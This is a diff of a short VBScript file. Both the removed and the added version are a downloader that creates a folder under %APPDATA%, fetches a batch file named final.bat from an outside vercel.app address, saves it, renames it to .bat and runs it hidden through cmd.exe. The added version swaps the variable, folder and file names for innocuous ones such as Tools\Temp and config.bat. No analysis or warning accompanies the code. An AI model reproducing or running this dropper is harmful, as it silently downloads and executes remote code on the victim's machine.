@@ -1,56 +1,25 @@
-Dim a, b, c, d, e, f, g
-
-Set a = CreateObject("WScript.Shell")
-
-Set b = CreateObject("Scripting.FileSystemObject")
-
-WScript.Sleep 3000
-
-c = a.ExpandEnvironmentStrings("%APPDATA%") & "\x\y"
-
-If b.FolderExists(c) Then b.DeleteFolder c, True
-
-d = Left(c, InStrRev(c, "\") - 1)
-
-If Not b.FolderExists(d) Then b.CreateFolder d
-
-b.CreateFolder c
-
-Set e = CreateObject("MSXML2.ServerXMLHTTP")
-
-e.Open "GET", "https://service-omega-snowy.vercel.app/final.bat", False
-
-e.Send
-
-Set f = CreateObject("ADODB.Stream")
-
-f.Type = 1
-
-f.Open
-
-f.Write e.responseBody
-
-f.Position = 0
-
-f.Type = 2
-
-f.Charset = "utf-8"
-
-g = f.ReadText
-
-g = Replace(g, "****", "----")
-
-f.Position = 0
-
-f.SetEOS
-
-f.WriteText g
-
-f.SaveToFile c & "\z.txt", 2
-
-If b.FileExists(c & "\z.bat") Then b.DeleteFile c & "\z.bat"
-
-b.MoveFile c & "\z.txt", c & "\z.bat"
-
-a.Run "cmd.exe /c """ & c & "\z.bat""", 0, False
-
+Set s=CreateObject("WScript.Shell")
+Set f=CreateObject("Scripting.FileSystemObject")
+p=s.ExpandEnvironmentStrings("%APPDATA%")&"\Tools\Temp"
+If f.FolderExists(p) Then f.DeleteFolder p,True
+If Not f.FolderExists(Left(p,InStrRev(p,"\")-1)) Then f.CreateFolder Left(p,InStrRev(p,"\")-1)
+f.CreateFolder p
+Set h=CreateObject("MSXML2.ServerXMLHTTP")
+h.Open "GET","https://service-omega-snowy.vercel.app/final.bat",False
+h.Send
+Set t=CreateObject("ADODB.Stream")
+t.Type=1
+t.Open
+t.Write h.responseBody
+t.Position=0
+t.Type=2
+t.Charset="utf-8"
+c=t.ReadText
+c=Replace(c,"****","----")
+t.Position=0
+t.SetEOS
+t.WriteText c
+t.SaveToFile p&"\config.txt",2
+If f.FileExists(p&"\config.bat") Then f.DeleteFile p&"\config.bat"
+f.MoveFile p&"\config.txt",p&"\config.bat"
+s.Run "cmd.exe /c """&p&"\config.bat""",0,False
